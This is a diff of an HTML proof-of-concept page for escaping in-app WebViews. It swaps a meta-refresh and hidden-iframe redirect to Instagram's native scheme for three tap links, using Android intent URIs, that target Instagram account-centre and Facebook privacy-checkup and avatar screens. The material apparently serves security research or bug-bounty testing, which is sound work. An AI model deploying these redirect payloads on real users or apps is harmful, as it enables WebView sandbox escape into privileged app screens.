@@ -1,12 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <!-- Use Meta Refresh to auto-redirect the browser to the native scheme -->
-    <meta http-equiv="refresh" content="1;url=instagram://account_center">
+    <title>WebView Escape PoC</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f9;}
+        a { display: block; margin: 20px; padding: 20px; background-color: #0084ff; color: white; text-decoration: none; font-size: 18px; border-radius: 8px; font-weight: bold; }
+    </style>
 </head>
 <body>
-    <h1>Testing Meta Refresh Escape...</h1>
-    <!-- iframe injection attempt -->
-    <iframe src="instagram://account_center" style="display:none;"></iframe>
+    <h2>Tap the buttons below to escape the WebView:</h2>
+
+    <!-- TARGET 1: IG Account Center Canary -->
+    <a href="intent://account_center/#Intent;scheme=instagram;package=com.instagram.android;end;">
+        1. Exploit IG Account Center
+    </a>
+
+    <!-- TARGET 2: FB Bloks Canary -->
+    <a href="intent://bloks/?app_id=com.bloks.www.screen_query.BloksUSFPrivacyCheckupRootScreenQuery#Intent;scheme=fb;package=com.facebook.katana;end;">
+        2. Exploit FB Bloks (Privacy Checkup)
+    </a>
+
+    <!-- TARGET 3: FB Avatar Canary -->
+    <a href="intent://avatar/#Intent;scheme=fb;package=com.facebook.katana;end;">
+        3. Exploit FB Avatar
+    </a>
+
 </body>
 </html>
